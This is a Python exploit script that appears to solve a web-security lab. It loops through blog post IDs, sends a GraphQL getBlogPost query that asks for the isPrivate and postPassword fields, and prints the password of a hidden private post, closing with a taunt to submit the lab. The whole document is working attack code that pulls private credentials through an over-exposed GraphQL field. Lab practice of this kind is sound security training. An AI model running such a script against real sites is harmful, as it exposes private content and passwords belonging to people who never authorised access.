import requests

# main target url
try:
    domain = input("Enter your target url: ").strip() or None
except KeyboardInterrupt:
    print("[!] Bye brother..")
    import sys; sys.exit(1)

if not domain:
    print("[x] Please enter domain.")
    import sys; sys.exit(1)

chck = requests.get(url=domain).status_code

if chck != 200:
    print("[x] Please check if the target is up and running.")
    print(f"[!] Status code: {chck}")
    import sys; sys.exit(1)

# we are good to go ahead.
# now, i'll loop from 1 to 9 to check which posts are accessible via '/post?postId='
# empty list which tracks which posts response returned by server as status code "404" (means private..)
sus_posts = []
for i in range(1,10):
    # print(i)
    # add 5 seconds timeout too
    handle = requests.get(url=f"{domain}/post?postId={i}", timeout=5)
    # this is the default graphql query.
    handle2 = requests.post(url=f"{domain}/graphql/v1", json={
        "query": """
        query getBlogPost($id: Int!) {
            getBlogPost(id: $id) {
                image
                title
                author
                date
                paragraphs
                isPrivate
                postPassword
            }
        }
        """,
        "operationName": "getBlogPost",
        "variables": {"id": i}
    }, timeout=5).json()
    # added and for .text check just for double confirmation !!!
    isPrivate1 = True if (handle.status_code == 404 and handle.text == '"Not Found"') else False
    # also check if the graphql query returns isPriate as True
    post = handle2.get("data", {}).get("getBlogPost") if isinstance(handle2, dict) else None
    isPrivate2 = bool(post and post.get("isPrivate") is True)
    # print(handle2['data']['getBlogPost'])
    # if
    if isPrivate1 and isPrivate2:
        # sus_posts.append(i)
        print(f"Post ID: {i}")
        print(f"Visibility Status: {("Private" if (isPrivate1 and isPrivate2) else "Public")}")
        print(f"Password: {handle2['data']['getBlogPost']['postPassword']}")
        print(f"Submit and solve the lab script kiddie ;)")
        break
    

# print(sus_posts)

# first, loop through 0 to 10 posts and check which one exists and which don't